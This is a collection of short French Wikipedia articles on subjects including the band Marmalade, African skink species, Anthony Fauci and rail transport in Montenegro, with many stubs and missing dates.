Histoire.
Marmalade est un groupe écossais de pop rock, de Glasgow, formé à l'origine en 1961, appelé d'abord Les Gaylords, puis les Dean Ford. En 1966, sur les conseils de leur agent Mike Smith, ils changent le nom du groupe pour The Marmalade.
En 1964, ils signe avec Columbia (EMI) avec Norrie Paramor et enregistre quatre singles, dont une reprise du tube américain de Chubby Checker, "Twenty Miles", qui est bien vendu localement. Le groupe devient connu en Écosse, ils décident d'essayer au Royaume-Uni.
En 1965, ils passent un long séjour en Allemagne, au Storyville à Cologne et à Duisbourg, avant de s'installer à Londres, où ils commencent à se construire une réputation dans les clubs.
En 1967, sort le single "I See The Rain", écrit par et Dean Ford.
Le jeudi , s'est avéré être un tournant majeur dans l'évolution du groupe quand ils font leurs débuts au London Marquee Club, le même soir dans le même club, jouait le Pink Floyd. Ils ont fait une tournée avec The Who, Joe Cocker, Gene Pitney et The Tremeloes. Ils ont joué au "Windsor Jazz and Rock Festival" en 1967, jouant avant Jerry Lee Lewis.
En 1972, Marmalade recrute un nouveau batteur, Dougie Henderson, et le guitariste Hugh Nicholson, un ex-membre de The Poets, un autre groupe de l'Écosse. Après le départ de Campbell, Pat Fairley quitte le groupe. Nicholson quitte le groupe en 1973 pour former les Blue, il est remplacé par Mike Japp, un guitariste de rock du groupe gallois 'Thank You'.
Discographie.
Le groupe a produit 9 albums :

</doc>
<doc id="6805846" url="https://fr.wikipedia.org/wiki?curid=6805846" title="Typhlacontias punctatissimus brainei">
Typhlacontias punctatissimus brainei



</doc>
<doc id="6805847" url="https://fr.wikipedia.org/wiki?curid=6805847" title="Wouter Vandendriessche">
Wouter Vandendriessche

Wouter Vandendriessche, né à Bruges le , est un joueur de football belge qui occupe le poste de milieu de terrain. Depuis 2011, il défend les couleurs du KRC Waregem, en Division 3. En 2006, il a remporté la Coupe de Belgique avec Zulte Waregem.
Carrière.
Les débuts à Zulte Waregem.
Natif de Bruges, Wouter Vandendriessche s'inscrit au centre de formation du FC Bruges. Il évolue dans les différentes catégories d'âge puis décide de quitter le club en 2004, ne recevant pas sa chance en équipe première. Il rejoint le SV Zulte Waregem, un club de deuxième division. Il joue son premier match officiel le contre Virton. Monté au jeu à moins d'une demi-heure de la fin de la rencontre, il inscrit son premier but quelques minutes plus tard. Titularisé lors des deux rencontres suivantes, il marque un but lors de chacune. Il dispute la quasi-totalité des matches jusqu'à la fin de la saison qui voit son club remporter le titre de champion et accéder pour la première fois à la Division 1.
Wouter Vandendriessche débute sa première saison parmi l'élite dans la peau d'un remplaçant. À la mi-octobre, il se blesse à l'entraînement et reste éloigné des terrains durant plusieurs mois. Il ne rejoue que le mais ne parvient pas à retrouver une place de titulaire dans une équipe qui réalise un championnat exceptionnel. La saison est ponctuée le par la victoire en finale de la Coupe de Belgique, dont le joueur dispute les vingt dernières minutes.
La saison suivante, Wouter Vandendriessche découvre la Coupe UEFA et inscrit un but face à l'Austria Vienne. Il inscrit également le seul but de son équipe lors de la Supercoupe perdue face à Anderlecht. Réserviste la plupart du temps, il quitte le club et s'engage le avec le KV Ostende, en Division 2.
Poursuite dans les divisions inférieures.
Avec le club côtier, Wouter Vandendriessche obtient une place de titulaire en milieu de terrain. Il dispute presque toutes les rencontres de la saison 2007-2008 et la première partie de la saison suivante. Hélas pour le joueur, il se blesse le et passe deux mois en convalescence. Lorsqu'il est rétabli, il ne parvient pas à retrouver sa place dans l'équipe de base et est relégué sur le banc des remplaçants. En juin, il décide de quitter le club et s'engage pour un an avec option pour une seconde saison au KSK Renaix, un autre club de deuxième division.
Avec sa nouvelle équipe, il dispute la moitié des rencontres de la saison. En fin de championnat, le club échoue à la place de barragiste. Vaincu par l'Union du Centre, Renaix est relégué en Division 3. Wouter Vandendriessche reste au club pour tenter de remonter directement dans l'antichambre de l'élite mais il termine le championnat en milieu de classement. Il quitte alors le club et rejoint le KRC Waregem, également en D3, où il signe un contrat portant sur les deux prochaines saisons.
À Waregem, il retrouve une place de titulaire et un rôle plus offensif. 

</doc>
<doc id="6805848" url="https://fr.wikipedia.org/wiki?curid=6805848" title="Typhlacontias punctatissimus punctatissimus">
Typhlacontias punctatissimus punctatissimus



</doc>
<doc id="6805849" url="https://fr.wikipedia.org/wiki?curid=6805849" title="Typhlacontias punctatissimus bogerti">
Typhlacontias punctatissimus bogerti



</doc>
<doc id="6805850" url="https://fr.wikipedia.org/wiki?curid=6805850" title="Typhlacontias punctatissimus">
Typhlacontias punctatissimus

Typhlacontias punctatissimus est une espèce de sauriens de la famille des Scincidae.
Répartition.
Cette espèce se rencontre dans le sud de l'Angola et dans le nord-ouest de la Namibie.
Liste des sous-espèces.
Selon :

</doc>
<doc id="6805853" url="https://fr.wikipedia.org/wiki?curid=6805853" title="Aérodrome de Mantes - Chérence">
Aérodrome de Mantes - Chérence

L’aérodrome de Mantes - Chérence (code OACI : LFFC) est un aérodrome agréé à usage restreint, situé sur la commune de Chérence dans le Val-d'Oise (région Île-de-France, France).
Il est utilisé pour la pratique d’activités de loisirs et de tourisme (vol à voile). Le terrain, propriété de la commune de Chérence, est exploité par l'Association aéronautique du Val-d'Oise (AAVO).
Histoire.
L’aérodrome de Mantes-Chérence a été fondé en 1947 pour la pratique exclusive du vol à voile. C'est en effet en que des scouts venus de diverses associations se regroupèrent à Chérence pour assurer la partie aérienne du jamboree de Moisson, commune située sur la rive gauche de la Seine au sud de l'aérodrome. Le scoutisme aérien demeura longtemps une des caractéristiques de ce terrain d'aviation.
Installations.
L’aérodrome dispose de deux pistes en herbe, longues de et larges de 100 :
L’aérodrome n’est pas contrôlé. Les communications s’effectuent en auto-information sur la fréquence de .
S’y ajoutent :
Activités.
Les activités sont gérées par l'Association aéronautique du Val-d'Oise (AAVO).

</doc>
<doc id="6805854" url="https://fr.wikipedia.org/wiki?curid=6805854" title="Typhlacontias rudebecki">
Typhlacontias rudebecki

Typhlacontias rudebecki est une espèce de sauriens de la famille des Scincidae.
Répartition.
Cette espèce est endémique d'Angola.
Étymologie.
Cette espèce est nommée en l'honneur de Gustaf Rudebeck (1913–2005).

</doc>
<doc id="6805857" url="https://fr.wikipedia.org/wiki?curid=6805857" title="Casino municipal de Biarritz">
Casino municipal de Biarritz

Le casino municipal de Biarritz est un immeuble de style Art déco édifié en 1929 par l'architecte Alfred Laulhé à Biarritz dans le département français des Pyrénées-Atlantiques en région Nouvelle-Aquitaine.
Partiellement rénové dans les années 1990, il est inscrit aux monuments historiques en 1992.
Histoire.
Un premier casino avait été construit entre 1856 et 1858 grâce à Benito R. de Monfort. 
L’architecte.
Fils d'un boulanger de l'avenue de France, Alfred Lamoureu, dit Laulhé, est né le à Biarritz. Après une scolarité au lycée de Bayonne il fait des études à l'école spéciale d'architecture de Paris, atelier Laynaud. Il sort diplômé en 1900. De 1903 à 1905 il collabore avec Édouard Niermans à la reconstruction de l'Hôtel du Palais. Sa collaboration avec ce prestigieux cabinet et son mariage avec la fille de l'entrepreneur chargé des travaux, Amélie Bourtayre, lui mettent "le pied a l'étrier". Alfred Laulhé meurt en 1956 à Biarritz, villa Gordiada, sans descendance.
Description.
Le casino se dresse sur la Grande Plage, en plein centre de Biarritz. Il contient, outre des salles de jeux et des salons de réception, un théâtre, une piscine, un restaurant ainsi qu'un bar sportif. 
Les éléments protégés par les monuments historiques sont constitués du vestibule, de la galerie et de l'élévation.
Il est aujourd'hui exploité par le Groupe Barrière qui inaugurait en son nouveau casino après neuf mois de travaux et d'investissement.

</doc>
<doc id="6805862" url="https://fr.wikipedia.org/wiki?curid=6805862" title="Rudawa (Petite-Pologne)">
Rudawa (Petite-Pologne)

Rudawa est un village de Pologne, située dans le sud du pays, dans la voïvodie de Petite-Pologne. Il fait partie de la gmina de Zabierzów, dans le powiat de Cracovie.

</doc>
<doc id="6805870" url="https://fr.wikipedia.org/wiki?curid=6805870" title="Typhlacontias johnsonii">
Typhlacontias johnsonii

Typhlacontias johnsonii est une espèce de sauriens de la famille des Scincidae.
Répartition.
Cette espèce est endémique d'Afrique du Sud.

</doc>
<doc id="6805873" url="https://fr.wikipedia.org/wiki?curid=6805873" title="Silat (Art martial des Philippines)">
Silat (Art martial des Philippines)



</doc>
<doc id="6805883" url="https://fr.wikipedia.org/wiki?curid=6805883" title="Typhlacontias ngamiensis">
Typhlacontias ngamiensis



</doc>
<doc id="6805884" url="https://fr.wikipedia.org/wiki?curid=6805884" title="Typhlacontias rohani">
Typhlacontias rohani

Typhlacontias rohani est une espèce de sauriens de la famille des Scincidae.
Répartition.
Cette espèce se rencontre dans le sud-est de l'Angola, au Botswana et au Zimbabwe.
Étymologie.
Cette espèce est nommée en l'honneur de Jacques de Rohan-Chabot (1889–1958).

</doc>
<doc id="6805886" url="https://fr.wikipedia.org/wiki?curid=6805886" title="Selective Laser Sintering">
Selective Laser Sintering



</doc>
<doc id="6805888" url="https://fr.wikipedia.org/wiki?curid=6805888" title="Léon Visart de Bocarmé">
Léon Visart de Bocarmé

Le comte Léon Ghislain Prudent Visart de Bocarmé, né le à Sint-Kruis et décédé le à Bruges est homme politique belge flamand, membre du parti catholique.
Biographie.
Il fut formé à l'École royale militaire (Belgique) (1855-57). Il fut élu conseiller communal de Alveringem (1876-93) et échevin (1894-1899). Il fut élu député belge (1870-1900).
Il fut créé comte en 1888.

</doc>
<doc id="6805890" url="https://fr.wikipedia.org/wiki?curid=6805890" title="Frittage sélective par laser">
Frittage sélective par laser



</doc>
<doc id="6805892" url="https://fr.wikipedia.org/wiki?curid=6805892" title="Typhlacontias gracilis">
Typhlacontias gracilis

Typhlacontias gracilis est une espèce de sauriens de la famille des Scincidae.
Répartition.
Cette espèce se rencontre dans le nord de la Namibie, dans le nord-ouest du Zimbabwe, dans le nord du Botswana, dans le sud-est de l'Angola et dans l'ouest de la Zambie.
Étymologie.
Son nom d'espèce, du latin "", « fin », lui a été donné en référence à sa morphologie.

</doc>
<doc id="6805893" url="https://fr.wikipedia.org/wiki?curid=6805893" title="Lingamiau">
Lingamiau

Lingamiau, né Édouard Cholet le à Limoges où il est mort le , était un entrepreneur limousin, qui a été responsable d’établissements bancaires, à Limoges, et qui a exercé son talent de conteur en écrivant des contes/.
Une vie de banquier, un talent de conteur.
Après ses études, Édouard Cholet a travaillé dans une banque, et il a été ensuite représentant de commerce en tissus. Puis, en 1870, il a fondé une banque ; il l’a dirigée d’abord avec des associés ; ensuite, il l’a dirigée seul jusqu’en 1912.
Tout au long de ces années, Édouard Cholet a exercé de nombreuses autres responsabilités ; ainsi, à la Caisse d’Épargne de Limoges, dont il a été administrateur, en 1882, puis le président, en 1912 ; ou encore à la Caisse Régionale du Crédit agricole dont il a été le directeur, dès sa création, en 1907.
Édouard Cholet, dans le même temps, a consacré une partie de son temps à la gestion d’institutions limougeaudes : il a été ainsi administrateur de l’Asile d’aliénés, et vice-président du Comité de la Bibliothèque populaire.
Mais Édouard Cholet a été aussi une autre personne, en quelque sorte, sous le nom de plume de Lingamiau, qui était le nom qu’il avait choisi pour écrire, publier, interpréter des contes/gnorles, produisant une œuvre, en langue limousine, qui a fait de lui un maître dans le genre limousin du conte/gnorle.
Il est mort à Limoges, en Haute-Vienne, le .
L’auteur de contes/gnorles, le diseur de contes.
Édouard Cholet a choisi ce nom de plume de Lingamiau, pour publier ses récits, ce terme de la langue limousine, « lingamiau » signifiant « langue à miel » : lingo a miau, substantif féminin, langue à miel, au figuré, langue doucereuse, à paroles mielleuses ; Édouard Cholet a pratiqué le genre du conte/gnorle, la gnorle désignant, en langue limousine, un conte farceur : niorlo, substantif féminin, faribole, conte bleu, exemple : counta de la niorla, raconter des choses risibles, invraisemblables.
Lingamiau a entamé sa carrière d’auteur de contes/gnorles, à quarante-sept ans, en 1860, en écrivant sa première gnorle : « Beucòp de bruch per far menut » ; d’autres gnorles suivront ; il a également écrit des chansons, des fables, des contes, des compliments, des odes ; ces textes ont été édités, et ils ont fait l’objet de rééditions chez des éditeurs comme Ducourtieux à Limoges.
La langue qu’a utilisée Lingamiau pour ses contes/gnorles, la langue limousine,était celle du peuple de Limoges et des campagnes limousines ; cette langue, l’auteur la connaissait bien ; il avait pratiqué cette langue au cours de son enfance, et il la parlait lors de ses déplacements dans les environs de Limoges ; il était alors en contact avec de personnes qui parlaient naturellement la langue du pays, la langue limousine, qui était souvent, pour eux, la langue de tous les jours.
Lingamiau avait un autre talent, qu’il a exercé à l’occasion de spectacles, et c’était le talent de conteur, d’interprète, devant un public, des récits qu’il écrivait ; il a laissé le souvenir d’un homme très doué dans cet art de la restitution orale du conte.
Ses contemporains, lettrés ou non, ont vivement apprécié ce qu’ils appelaient ses « patoiseries », et certains, à l’époque, ont qualifié de chefs-d’œuvre les contes/gnorles de Lingamiau.

</doc>
<doc id="6805894" url="https://fr.wikipedia.org/wiki?curid=6805894" title="Unité urbaine de Carcassonne">
Unité urbaine de Carcassonne

L'unité urbaine de Carcassonne est une unité urbaine française centrée sur la commune de Carcassonne, préfecture de l'Aude, au cœur de la deuxième agglomération de ce département. 
Données générales.
En 2010, selon l'INSEE, l"'unité urbaine de Carcassonne" était composée de trois communes, toutes situées dans le département de l'Aude, plus précisément dans l'arrondissement de Carcassonne.
En 2020, l'Insee a procédé à une révision des délimitations des unités urbaines de la France; celle de Carcassonne est composée de deux communes, soit une de moins qu'en 2010, la commune de Cazilhac.
En , avec , elle représente la urbaine du département de l'Aude après l'unité urbaine de Narbonne qui occupe le départemental. Elle forme avec celle-ci les deux seules unités urbaines de plus de du département. En Occitanie où elle se situe, elle occupe le régional après l'unité urbaine de Rodez ( régional) et avant l'unité urbaine de Pamiers qui se positionne au .
En 2022, sa densité de population s'élève à . Par sa superficie, elle représente 1,1 % du territoire départemental mais, par sa population, elle regroupe 12,54 % de la population du département de l'Aude.
Composition 2020 de l'unité urbaine.
Elle est composée des deux communes suivantes :

</doc>
<doc id="6805895" url="https://fr.wikipedia.org/wiki?curid=6805895" title="Typhlacontias brevipes">
Typhlacontias brevipes

Typhlacontias brevipes est une espèce de sauriens de la famille des Scincidae.
Répartition.
Cette espèce se rencontre dans le sud de l'Angola et dans le nord-ouest de la Namibie.
Étymologie.
Le nom spécifique "brevipes" vient du latin ', court, et de ', le pied, en référence à l'aspect de ce saurien.

</doc>
<doc id="6805897" url="https://fr.wikipedia.org/wiki?curid=6805897" title="Lamèch (cratère)">
Lamèch (cratère)

Lamèch est un cratère lunaire situé sur la face visible de la Lune. Il se trouve à l'extrémité orientale du massif montagneux des Montes Caucasus situé autour de la Mare Orientale. Il est situé au sud-ouest du grand cratère Eudoxus. Le cratère Lamèch a une forme de cuvette et possède un contour à peu près circulaire. Ce cratère n'est pas érodé et n'a pas subi de cratères d'impacts.
En 1935, l'Union astronomique internationale lui a attribué le nom de Lamèch en l'honneur de l'astronome français d'origine tunisienne Félix Chemla Lamèch.

</doc>
<doc id="6805912" url="https://fr.wikipedia.org/wiki?curid=6805912" title="Corine Petit-Franco">
Corine Petit-Franco



</doc>
<doc id="6805914" url="https://fr.wikipedia.org/wiki?curid=6805914" title="Makan Traoré">
Makan Traoré



</doc>
<doc id="6805919" url="https://fr.wikipedia.org/wiki?curid=6805919" title="Typhlacontias kataviensis">
Typhlacontias kataviensis

Typhlacontias kataviensis est une espèce de sauriens de la famille des Scincidae.
Répartition.
Cette espèce est endémique de l'Ouest de la Tanzanie.
Étymologie.
Son nom d'espèce, composé de "katavi" et du suffixe latin "", « qui vit dans, qui habite », lui a été donné en référence au lieu de sa découverte, le parc national de Katavi.

</doc>
<doc id="6805928" url="https://fr.wikipedia.org/wiki?curid=6805928" title="Caterina Sylos Labini">
Caterina Sylos Labini

Caterina Sylos Labini (née le à Matera, en Basilicate) est une actrice italienne.
Biographie.
Caterina Sylos Labini est diplômée de l'Académie "Silvio D'Amico" à Rome et est connue pour avoir interprété le personnage de Caterina Cecchini dans la série "Un sacré détective".

</doc>
<doc id="6805930" url="https://fr.wikipedia.org/wiki?curid=6805930" title="Typhlosaurus braini">
Typhlosaurus braini

Typhlosaurus braini est une espèce de sauriens de la famille des Scincidae.
Répartition.
Cette espèce est endémique de Namibie.
Description.
C'est un saurien vivipare.
Étymologie.
Cette espèce est nommée en l'honneur de Charles Kimberlin Brain.

</doc>
<doc id="6805933" url="https://fr.wikipedia.org/wiki?curid=6805933" title="25 décembre 1935">
25 décembre 1935

Le est le jour de l'année 1935 du calendrier grégorien. Il s'agit d'un mercredi. 

</doc>
<doc id="6805934" url="https://fr.wikipedia.org/wiki?curid=6805934" title="Ivana Popović">
Ivana Popović

Ivana Popović est une ancienne joueuse de volley-ball serbe née le à Paris (France). Elle mesure et jouait au poste d'attaquante. 

</doc>
<doc id="6805936" url="https://fr.wikipedia.org/wiki?curid=6805936" title="Anthony Fauci">
Anthony Fauci

Anthony Stephen Fauci, né le à Brooklyn, est un immunologue américain. De 1984 à 2022, il est le directeur de l'Institut national des allergies et maladies infectieuses (NIAID), un centre de recherche du département américain de la Santé.
Son travail, en tant que chercheur et directeur du NIAID, a permis des avancées importantes dans le domaine du sida et autres cas d'immunodéficience.
Il a été conseiller en chef pour la santé publique de huit présidents américains successifs, de Ronald Reagan à Joe Biden, dont Donald Trump (pendant 4 ans). Durant la pandémie de Covid-19 aux États-Unis, il a été nommé à la cellule de crise de l'administration Trump sur le coronavirus ("White House Coronavirus Task Force"), jouant un rôle de premier plan, tant en termes de communication sur le virus, qu'en termes de stratégie et de conseil pour le combattre. Anthony Fauci a alors souvent dû contredire le président Donald Trump .
Il décide de quitter ses fonctions à l'âge de 82 ans.
Biographie.
Éducation.
 Sorti avec son diplôme de fin d'études secondaires de la ' de New York, il commence des études supérieures au ', et obtient son doctorat en médecine à la faculté de médecine de l'université Cornell (') en 1966. Il fait ensuite son internat à New York, au '.
Carrière.
En 1968, il entre aux Instituts américains de la santé (', NIH) et travaille comme clinicien associé au laboratoire d'études cliniques (' (LCI)) au sein NIAID.
En 1974, il devient responsable du département de physiologie clinique avant d'être nommé responsable du laboratoire d'immunorégulation en 1980, fonction qu'il occupe toujours. En 1984, il est nommé directeur du NIAID, qui a la responsabilité d'un large éventail de recherches, fondamentales et appliquées, sur les infections et les maladies auto-immunes.
Anthony Fauci est membre de l'Académie nationale des sciences, de l'Académie américaine des arts et des sciences, membre du Conseil de l"'Institute of medecine", de la Société américaine de philosophie, de l'Académie royale danoise des sciences et des lettres. Il appartient également à de nombreuses sociétés professionnelles, notamment la Société américaine de recherches cliniques, la Société américaine des maladies infectieuses et l'Association américaine des immunologistes.
Il est membre du comité de rédaction de plusieurs journaux scientifiques, éditeur du "" et auteur, coauteur ou directeur de publication de plus de publications scientifiques ou manuels universitaires.
En août 2022, Anthony Fauci a précisé qu’il se retirerait en décembre 2022 de son poste de directeur de l’Institut national des allergies et des maladies infectieuses.
Recherches médicales.
Les nombreux travaux de Fauci sur la régulation des réponses immunitaires humaines ont notamment éclairé les mécanismes par lequel les agents immunosuppresseurs s'adaptent à la réponse immunitaire humaine. Ils lui ont permis de développer des thérapies pour des maladies jadis fatales, telle que la périartérite noueuse, la granulomatose de Wegener et la granulomatose lymphomatoïde.
En 1985, une enquête administrée par l'université Stanford auprès des membres de l""' cite le travail d'Anthony Fauci sur le traitement de la périartérite noueuse et la granulomatose de Wegener comme une des avancées majeures des 20 dernières années dans le domaine de la rhumatologie.
Fauci a également développé les connaissances sur la manière dont le VIH détruit les défenses de l'hôte pour progresser vers le sida. Il a montré que l'expression de cytokine endogène induit l'expression du VIH, et a joué un rôle important dans le développement de stratégies pour le suivi thérapeutique et la reconstruction immunitaire des patients souffrant de cette maladie, ainsi que pour la vaccination préventive contre les infections par le VIH. Ses recherches actuelles se concentrent sur l'identification de la nature des mécanismes immunopathogènes des infections au VIH et la portée des réponses immunitaires au VIH.
En 2003, l'Institut pour l'information scientifique classe Fauci au treizième rang des scientifiques les plus cités entre 1983 et 2002. Il figure au neuvième rang en immunologie pour la période située entre le et le .
Pandémie de Covid-19.
Au début de la pandémie de Covid-19, il est nommé le 29 janvier 2020 à la cellule de crise de l'administration Trump sur le coronavirus ("White House Coronavirus Task Force").
Il y joue un rôle de premier plan tant en termes de communication sur le virus qu'en termes de stratégie et de conseil : personne la plus écoutée de l'administration américaine, bien que Donald Trump le contredise régulièrement voire menace de le , il intervient chaque soir à la télévision afin d'informer les Américains sur l'évolution de la situation. Il contredit parfois le président Donald Trump, par exemple lorsque celui-ci minimise les risques sanitaires ou avance des méthodes de traitement ressemblant plutôt à des plaisanteries telles que : .
 pour sa gestion de la pandémie, sa politique de confinement, de vaccination concernant tous les groupes d'âge dont les étudiants et les enfants au lieu de se focaliser sur les groupes à risque, son plaidoyer pour la fermeture des écoles considérant ses effets négatifs sur les enfants, ainsi que la sous-estimation des dommages collatéraux pour la santé publique des décisions prises dans le cadre de lutte contre la pandémie.
Il a également fait l'objet de nombreuses et vives réactions complotistes des partisans de Donald Trump, souvent issus de l'alt-right. Des vidéos complotistes le concernant ont accumulé des centaines de milliers de vues en quelques jours, tandis que des publications accusatrices sur Facebook ont été fortement diffusées. .
Dans les critiques visant Anthony Fauci, son ancienne collaboratrice et complotiste Judy Mikovits s'est particulièrement illustrée. Lorsqu’on leur a demandé de commenter certaines des allégations formulées par cette dernière contre Anthony Fauci, les NIH et le NIAID ont déclaré à NPR : « Les "National Institutes of Health" et le "National Institute of Allergy and Infectious Diseases" se concentrent sur la recherche critique visant à mettre fin à la pandémie de COVID-19 et à empêcher de nouveaux décès. Nous ne nous engageons pas dans des tactiques de la part de certains qui cherchent à faire dérailler nos efforts ».
Début 2021, il est maintenu à son poste par Joe Biden.
En 2021, des médias américains publient une partie des e-mails échangés entre Anthony Fauci et d'autres chercheurs, de janvier à juin 2020, concernant l'étude du Covid-19. Une partie importante des e-mails avaient des passages censurés, ce qui a entraîné des spéculations et des théories du complot, en particulier sur l'origine du Covid. Certains commentateurs accusent Fauci d'avoir fait pression pour convaincre des chercheurs favorables à l'hypothèse « lab leak » (hypothèse que le virus se serait échappé d'un laboratoire de Chine) de mentir publiquement et de présenter cette hypothèse comme peu crédible. En , tous les e-mails sont publiés non censurés, et révèlent que les spéculations étaient non fondées. En réalité les chercheurs ont décidé d'éviter de parler de cette hypothèse en l'absence de preuves suffisantes car ils considéraient que spéculer pourrait être contreproductif dans la lutte mondiale contre l'épidémie de Covid ; les chercheurs ayant déjà prouvé que le virus n'a pas été fabriqué par l'homme et a une origine naturelle, même s'il avait fuité d'un laboratoire.
Le , au dernier jour de sa présidence, Joe Biden lui accorde une grâce préventive, destinée à empêcher toute poursuite judiciaire de la part de l'administration Trump.
Distinctions.
Doctorats "honoris causa".
Anthony Fauci a reçu de plus quarante-cinq doctorats "honoris causa" :
Voir aussi.
Liens externes.
 

</doc>
<doc id="6805941" url="https://fr.wikipedia.org/wiki?curid=6805941" title="Dobra">
Dobra

Dobra peut désigner :

</doc>
<doc id="6805942" url="https://fr.wikipedia.org/wiki?curid=6805942" title="Typhlosaurus lomii">
Typhlosaurus lomii



</doc>
<doc id="6805943" url="https://fr.wikipedia.org/wiki?curid=6805943" title="Typhlosaurus lomiae">
Typhlosaurus lomiae

Typhlosaurus lomiae est une espèce de sauriens de la famille des Scincidae.
Répartition.
Cette espèce est endémique du Little Namaqualand en Afrique du Sud.
Description.
C'est un saurien vivipare.
Étymologie.
Cette espèce est nommée en l'honneur de Lomi Wessels.

</doc>
<doc id="6805954" url="https://fr.wikipedia.org/wiki?curid=6805954" title="François Van Brussel">
François Van Brussel

François (Frans) Van Brussel, né le à Stekene et décédé le à Lokeren est homme politique belge flamand, membre du parti catholique.
Il fut agriculteur. Il fut élu à la Chambre des Représentants (1898-1921).

</doc>
<doc id="6805956" url="https://fr.wikipedia.org/wiki?curid=6805956" title="Kenzō Okada">
Kenzō Okada

 est un peintre japonais né le à Yokohama et mort le à Tokyo. Son activité se déroule depuis 1950, aux États-Unis. 
Biographie.
Kenzō Okada est un peintre à la gouache à tendance Abstraite. En 1920, il est diplômé de l'Université Meiji Gakuin. De 1922 à 1924, il est élève de École des beaux-arts de Tokyo. De 1924 à 1927, il séjourne à Paris, travaillant avec Foujita, et participe au Salon d'automne. Revenu au Japon, il adhère au groupe "Nikakai". De 1940 à 1950, il enseigne dans divers établissements publics. C'est en 1950 qu'il se fixe à New York où il participe à de nombreuses expositions collectives, dont : 1955 Biennale de São Paulo et Pittsburgh à l'Exposition Internationale Carnegie où il obtient une distinction, et y est de nouveau sélectionné en 1958 ; cette même année, Biennale de Venise où il est également distingué comme auparavant en 1957, par l'Académie américaine des arts et des lettres ; en 1959, il obtient une subvention de la Fondation Ford.
Son parcours.
Il présente des ensembles d'œuvres dans des expositions personnelles : plusieurs à Tokyo de 1929 à 1935; à New York : en 1953, 1955, 1956, 1959, 1962 ; Chicago 1956 ; Los Angeles 1959 ; etc. Il pratique une abstraction allusive, d'une grande délicatesse de matière et de tonalité subtiles, évoquant volontiers les motifs décoratifs traditionnels d'Extrême-Orient : éventails, toitures incurvées, jardins de pierres, clair de lune, dans une interprétation poétique d'un Japon idéalisé.

</doc>
<doc id="6805957" url="https://fr.wikipedia.org/wiki?curid=6805957" title="Chronologie de l'histoire de Salé">
Chronologie de l'histoire de Salé



</doc>
<doc id="6805959" url="https://fr.wikipedia.org/wiki?curid=6805959" title="Équipe cycliste Rabobank">
Équipe cycliste Rabobank



</doc>
<doc id="6805963" url="https://fr.wikipedia.org/wiki?curid=6805963" title="Paulina Głaz">
Paulina Głaz

Paulina Głaz est une joueuse de volley-ball polonaise née le à Tomaszów Lubelski. Elle mesure et joue au poste de réceptionneuse-attaquante. Elle totalise en équipe de Pologne.

</doc>
<doc id="6805968" url="https://fr.wikipedia.org/wiki?curid=6805968" title="Demarchi">
Demarchi



</doc>
<doc id="6805969" url="https://fr.wikipedia.org/wiki?curid=6805969" title="Justin Van Cleemputte">
Justin Van Cleemputte

Justin Auguste Van Cleemputte, né le et décédé le est homme politique belge flamand, membre du parti catholique.
Il fut docteur en droit (KUL,1864). Il fut avocat à la Cour d'Appel de Gand (1864-1926) et bâtonnier de l'Ordre des avocats de la Cour d'Appel de Gand (1890-91 et 1906-08)), puis vice-président de la "Fédération des Avocats belges" (1891).&lt;br&gt;
Il fut membre de la "commission des Statistiques de Flandre orientale" (1887-1894), cofondateur et vice-président du "Haut Conseil du Travail" (1892-1926), membre de la commission d'enquête sur la question du droit privé international (1899-1926) et président de la "Commission accidents du travail" (1903-1926) et de la "Commission de la législation agricole"; président d'honneur de la "Federation des Mutualités de Flandre Orientale".

</doc>
<doc id="6805981" url="https://fr.wikipedia.org/wiki?curid=6805981" title="Transport ferroviaire au Monténégro">
Transport ferroviaire au Monténégro

Le transport ferroviaire au Monténégro est géré par quatre compagnies différentes qui s'occupent indépendamment des infrastructures, du transport de passagers, du fret et de la maintenance du matériel roulant. Les quatre compagnies faisaient partie de la compagnie publique ŽCG (Željeznica Crne Gore / Жељезница Црне Горе, en français : Chemins de fer du Monténégro) jusqu'à sa dissolution en 2008.
Le code attribué au Monténégro par l'Union internationale des chemins de fer est le .
Histoire.
La première ligne de chemin de fer ouverte sur le territoire de l'actuel Monténégro a été ouverte en 1901 entre Gabela et Zelenika. Cette ligne à voie étroite (écartement de ) a été construite par l'Autriche-Hongrie, possédant le territoire de Boka Kotorska à l'époque.
Cependant les travaux de la première ligne de chemins de fer de la principauté du Monténégro ont commencé en 1905 entre Bar et Virpazar. D'un écartement de , cette ligne de a été ouverte en 1908. Son extension de Virpazar à Cetinje (alors capitale) était prévue mais n'a pas été réalisée à cause d'un manque de financements et du début de la Première Guerre mondiale. Cette ligne de montagne, historique, surmontait un dénivelé de sur . Cette montée atteignait une pente maximale de au niveau de la montagne Sutorman. Cette prouesse n'était pas due à la technique de crémaillère mais à un tracé innovant mis au point par des ingénieurs italiens. Les vitesses d'exploitation étaient cependant faibles, pour le transport de passagers et pour le fret.
Le réseau ferroviaire s'est étendu durant la période pendant laquelle le Monténégro faisait partie du royaume de Yougoslavie. En 1927, la ligne Podgorica - Plavnica (écartement de ) est ouverte, suivie par la ligne Bileća - Nikšić en 1938. À cette époque, le réseau mesurait de longueur mais n'était pas standardisé. En effet, bien que l'écartement le plus fréquent était de , certaines lignes possédaient des écartements plus faibles, notamment et . Ces différences compliquaient le fonctionnement du réseau et imposaient un transport multimodal. Ainsi le fret arrivé à Bar et à destination de Podgorica devait être transporté par rail de Bar à Virpazar () puis par bateau sur le lac de Skadar pour rejoindre Plavnica et enfin à nouveau par le rail de Plavnica à Podgorica (). Le transport ferroviaire du Monténégro était donc sous-développé et mal organisé avant qu'éclate la Seconde Guerre mondiale.
La ligne Podgorica - Nikšić (écartement de ) est terminée après la Seconde Guerre mondiale, en 1948. Le premier pas vers la modernisation du réseau est le début de la construction de la partie monténégrine de la ligne Belgrade - Bar. La première tranche des travaux (de Bar à Podgorica) est achevée en 1959, il s'agit alors de la première section à écartement standard du Monténégro. À la même époque les lignes étroites Podgorica - Plavnica et Bar - Virpazar sont mises hors service. En 1965, le corridor Podgorica - Nikšić est modernisé et la ligne est passée à écartement standard, standardisant ainsi la totalité de la connexion de Bar à Nikšić via Podgorica. Les petites lignes Nikšić - Bileća et Gabela - Zelenika sont fermées à la même époque. La partie monténégrine du projet ferroviaire Belgrade-Bar (de Bar à Vrbnica, à la frontière serbe) est terminée en 1976, connectant Bar et Podgorica au Nord du Monténégro, à la Serbie ainsi qu'au réseau ferroviaire européen. À cette époque la longueur du réseau monténégrin atteint et la transition de l'écartement étroit à l'écartement standard est terminée.
Le dernier ajout au réseau ferroviaire monténégrin est la ligne Podgorica – Shkodër, ouverte en 1986. Depuis son ouverture cette ligne est réservée au transport de marchandises.
Réseau.
Caractéristiques.
